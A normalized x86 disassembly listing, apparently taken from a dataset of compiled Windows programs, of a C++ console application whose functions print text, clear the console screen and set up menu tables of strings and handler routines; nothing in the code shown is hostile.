push ecx
push r--data
push ecx
push 0x20
push ecx
push r--data
push ecx
push r--data
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_404c10
add esp 0xc
push eax
call sub_40e950
add esp 0xc
push eax
call sub_404c10
add esp 0xc
push eax
call sub_40e950
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_42a890
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
push 0xfffffff5
call [ GetStdHandle@IAT ]
lea edx [ ebp - 0x1c ]
mov esi eax
push edx
xor eax eax
push esi
mov [ ebp - 0x20 ] eax
call [ GetConsoleScreenBufferInfo@IAT ]
movsx ecx [ ebp - 0x1a ]
movsx edx [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
imul ecx edx
lea eax [ ebp - 0x24 ]
push eax
push edi
push ecx
push 0x20
push esi
call [ FillConsoleOutputCharacterW@IAT ]
push edi
push esi
call [ SetConsoleCursorPosition@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov al 0x1
pop esi
call sub_437c1c
mov esp ebp
pop ebp
retn
sub_42a910
push esi
push edi
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
pop edi
mov al 0x1
pop esi
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_42a980
push esi
push edi
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
pop edi
mov al 0x1
pop esi
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_42a9f0
push ebp
mov ebp esp
push 0xffffffff
push sub_453ba8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x8c ] esi
mov [ ebp - 0x90 ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x84 ] ax
mov ebx 0x7
push 0x4
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x8c ] 0x1
mov [ ebp - 0x88 ] sub_42ab90
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0x68 ] cx
push 0x1d
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor edx edx
push 0x8
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4c ] sub_42ace0
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ebp - 0x2c ] ax
push 0x23
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
xor edx edx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] dx
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x54 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] cx
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] ax
jb r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x84 ]
push ecx
call sub_43811c
add esp 0x4
sub_42ab90
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452d30
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x3c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esp + 0x24 ] 0x7
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] ax
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x5c ] eax
call sub_40e230
add esp 0x4
test al al
je r-xdata
push 0x0
lea edx [ esp + 0x30 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x68 ] 0x1
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
cmp [ esp + 0x40 ] 0x8
jb r-xdata
lea edx [ esp + 0x10 ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp [ esp + 0x24 ] 0x8
jb r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x3c ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0x10 ]
push ecx
call sub_43811c
add esp 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
sub_42ace0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452d30
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x3c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esp + 0x24 ] 0x7
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] ax
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x5c ] eax
call sub_40e2d0
add esp 0x4
test al al
je r-xdata
push 0x0
lea edx [ esp + 0x30 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x68 ] 0x1
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
cmp [ esp + 0x40 ] 0x8
jb r-xdata
lea edx [ esp + 0x10 ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp [ esp + 0x24 ] 0x8
jb r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x3c ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0x10 ]
push ecx
call sub_43811c
add esp 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
sub_42ae30
push ebp
mov ebp esp
push 0xffffffff
push sub_4542e4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x138
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x140 ] esi
mov [ ebp - 0x144 ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x138 ] ax
mov ebx 0x7
push 0x8
mov eax r--data
lea ecx [ ebp - 0x138 ]
mov [ ebp - 0x140 ] 0x1
mov [ ebp - 0x13c ] sub_42b1e0
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x128 ] esi
call sub_401c90
xor ecx ecx
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x11c ] cx
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x4 ] 0x1
call sub_4173f0
xor edx edx
push 0x9
mov eax r--data
lea ecx [ ebp - 0xfc ]
mov [ ebp - 0x100 ] sub_42b5e0
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] dx
call sub_401c90
xor eax eax
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xe0 ] ax
lea eax [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor ecx ecx
mov [ ebp - 0xc0 ] cx
push 0x8
mov eax r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xc4 ] sub_42c790
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor edx edx
push 0x41
mov eax r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] dx
call sub_401c90
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
xor eax eax
mov [ ebp - 0x48 ] ax
push 0xa
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4c ] sub_42b970
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
xor ecx ecx
mov [ ebp - 0x2c ] cx
push 0x37
mov eax r--data
lea ecx [ ebp - 0x2c ]
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x6
call sub_4173f0
xor edx edx
push 0xc
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x88 ] sub_42ba30
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] dx
call sub_401c90
mov [ ebp - 0x4 ] bl
xor eax eax
mov [ ebp - 0x68 ] ax
push 0x6c
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x8
call sub_4173f0
cmp [ ebp - 0x54 ] 0x8
jb r-xdata
xor edx edx
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
jb r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] cx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] ax
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x90 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] cx
jb r-xdata
mov eax [ ebp - 0xa4 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0xcc ] 0x8
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] ax
jb r-xdata
mov edx [ ebp - 0xc0 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0xe8 ] 0x8
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xe0 ] dx
jb r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x108 ] 0x8
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] cx
jb r-xdata
mov eax [ ebp - 0xfc ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x124 ] 0x8
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x11c ] ax
jb r-xdata
mov edx [ ebp - 0x11c ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x138 ]
push ecx
call sub_43811c
add esp 0x4
sub_42b1e0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452cf8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
mov [ esp + 0x80 ] edi
mov esi [ eax ]
mov ecx [ eax + 0x4 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
neg ecx
sbb ecx ecx
lea eax [ esp + 0x10 ]
and ecx esi
push eax
call sub_410230
add esp 0x4
test al al
je r-xdata
push edi
lea ecx [ esp + 0x58 ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x90 ] 0x2
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor ebx ebx
test cl 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp ebx edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp ebx edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x68 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
mov ebx [ esp + 0x10 ]
cmp ebx [ esp + 0x14 ]
je r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0x54 ]
push edx
call sub_43811c
add esp 0x4
push edi
push eax
call sub_402d50
or eax 0x4
cmp ebx edi
je r-xdata
add ebx 0x4
jmp r-xdata
push edi
push eax
call sub_402d50
or eax 0x4
mov al 0x1
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
cmp ebx [ esp + 0x14 ]
je r-xdata
mov eax [ ebx ]
lea ecx [ esp + 0x54 ]
call sub_42cc00
mov [ esp + 0x20 ] eax
push edi
lea edx [ esp + 0x28 ]
push 0x5
push edx
mov [ esp + 0x8c ] 0x1
call sub_4374b3
mov edx [ eax + 0xc ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
add ecx rw-data
push edx
push ecx
call eax
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
add esp 0xc
add eax rw-data
mov edx 0x20
push edi
mov [ eax + 0x40 ] dx
lea eax [ esp + 0x48 ]
push 0x5
push eax
call sub_4374b3
add esp 0xc
push 0x9
push ecx
mov ecx [ ebx - 0x4 ]
push ecx
push rw-data
mov edi eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push ebx
call sub_43811c
add esp 0x4
lea esi [ ebx + 0x1c ]
lea ebx [ ebx ]
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
push ecx
push edx
push eax
mov eax [ edi ]
call eax
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
add esp 0xc
mov edx 0x20
push 0x0
mov [ eax + esi + 0x40 ] dx
lea eax [ esp + 0x38 ]
push 0xf
push eax
call sub_4374b3
add esp 0xc
push 0x9
push ecx
mov ecx [ ebx ]
push ecx
push esi
mov edi eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
add eax esi
xor ecx ecx
mov [ esi ] 0x7
mov [ esi - 0x4 ] edi
mov [ esi - 0x14 ] cx
add esi 0x24
lea edx [ esi - 0x1c ]
cmp edx [ esp + 0x14 ]
jne r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
push ecx
push edx
push eax
mov eax [ edi ]
call eax
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov edx 0x20
mov [ eax + esi + 0x40 ] dx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x14 ]
mov edx [ esp + 0x2c ]
add esp 0xc
and ecx 0xfffffe7f
push edx
or ecx 0x40
push esi
mov [ eax + esi + 0x14 ] ecx
call sub_40a0a0
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
add eax esi
cmp [ esi ] 0x8
jb r-xdata
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
xor ecx ecx
jmp r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ ecx + 0x14 ]
and edx 0xfffffebf
or edx 0x80
mov [ ecx + 0x14 ] edx
lea ecx [ ebx + 0x4 ]
push ecx
push ecx
push 0x9
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov [ esp + 0x80 ] 0x0
cmp [ esp + 0x68 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
add ebx 0x24
lea eax [ ebx - 0x4 ]
xor edi edi
cmp eax [ esp + 0x14 ]
jne r-xdata
mov edx [ esp + 0x54 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
jmp r-xdata
sub_42b5e0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_453b30
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x78 ] ebx
mov esi [ eax ]
mov ecx [ eax + 0x4 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
neg ecx
sbb ecx ecx
lea eax [ esp + 0x10 ]
and ecx esi
push eax
call sub_4103a0
add esp 0x4
test al al
je r-xdata
push ebx
lea eax [ esp + 0x48 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x88 ] 0x1
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x58 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov edi [ esp + 0x10 ]
cmp edi [ esp + 0x14 ]
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov edi [ esp + 0x10 ]
mov edx [ esp + 0x44 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
test edi edi
je r-xdata
add edi 0x24
push ebx
push eax
call sub_402d50
or eax 0x4
mov al 0x1
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ esp + 0x20 ]
mov ebx [ esp + 0x14 ]
push eax
mov eax edi
call sub_410cf0
add esp 0x4
push edi
call sub_43811c
add esp 0x4
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
push ecx
push edx
push eax
mov eax [ ebx ]
call eax
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
add esp 0xc
push 0x0
lea ecx [ esp + 0x48 ]
mov eax 0x20
push 0x30
push ecx
mov [ edx + esi + 0x40 ] ax
call sub_4374b3
mov edx [ edi - 0x24 ]
add esp 0xc
push 0x9
push ecx
push edx
push esi
mov ebx eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
push ecx
push edx
push eax
mov eax [ ebx ]
call eax
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov eax 0x20
mov [ edx + esi + 0x40 ] ax
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov edx [ eax + esi + 0x14 ]
add esp 0xc
and edx 0xfffffe7f
or edx 0x40
push edi
push esi
mov [ eax + esi + 0x14 ] edx
call sub_40a0a0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
xor ecx ecx
jmp r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ ecx + 0x14 ]
and edx 0xfffffebf
or edx 0x80
mov [ ecx + 0x14 ] edx
lea ecx [ edi - 0x1c ]
push ecx
push ecx
push 0x9
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
add edi 0x40
lea edx [ edi - 0x24 ]
cmp edx [ esp + 0x14 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
push 0x0
lea edx [ esp + 0x28 ]
push 0x5
push edx
call sub_4374b3
mov edx [ eax + 0xc ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
add ecx rw-data
push edx
push ecx
call eax
mov ecx [ rw-data ]
mov edx [ ecx + 0x4 ]
add esp 0xc
push 0x0
lea ecx [ esp + 0x38 ]
mov eax 0x20
push 0x5
push ecx
mov [ edx + rw-data ] ax
call sub_4374b3
mov edx [ edi - 0x20 ]
add esp 0xc
push 0x9
push ecx
push edx
push rw-data
mov ebx eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
mov esi eax
add esp 0x8
test esi esi
je r-xdata
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_42b970
push ebp
mov ebp esp
